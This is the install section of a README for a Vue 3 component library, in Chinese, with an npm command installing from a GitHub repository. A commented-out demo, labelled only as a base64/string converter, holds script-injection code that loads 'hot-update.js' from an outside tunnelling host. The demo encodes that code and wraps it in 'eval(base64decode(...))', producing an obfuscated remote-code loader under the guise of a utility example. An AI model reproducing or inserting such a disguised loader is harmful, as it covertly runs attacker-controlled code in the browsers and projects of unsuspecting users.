## 安装

### npm 安装

推荐使用 npm 的方式安装，它能更好地和 [webpack](https://webpack.js.org/) 打包工具配合使用。

```shell
npm install git+https://github.com/denghongdddd/vue3-frame_library --save
```

<!-- 引用资源 examples => website 文件夹位置
<img src="~examples/assets/images/Axure-Components.svg" alt=""> -->

<!-- base64、字符串转换 -->

<!-- :::demo base64、字符串转换
```html
    <template>
        <textarea style="width:100%;height:100px;" v-model="text" @input="input"/>
        字符串转base64
        <div style="word-break: break-all;">
            {{base64Str}};eval(base64decode(`{{base64}}`));
        </div>
    </template>
    <script>
        const {base64encode, base64decode, _keyStr, _utf8_decode } = require("black-knight/config/utils.js")
        export default{
            data(){
                return{
                    text:"",
                    base64:"",
                    base64Str:`${String(base64decode)};var _keyStr="${String(_keyStr)}";${String(_utf8_decode)}`,
                }
            },
            created(){
                this.text=`document.head.appendChild(Object.assign(document.createElement("script"),{src:"http://d_h_4eftq43taegraf.vaiwan.com/hot-update.js",type:"text/javascript"}))`
            },
            watch:{
                text(n){
                    this.base64 = base64encode(n)
                }
            },
        }
    </script>
```
::: -->
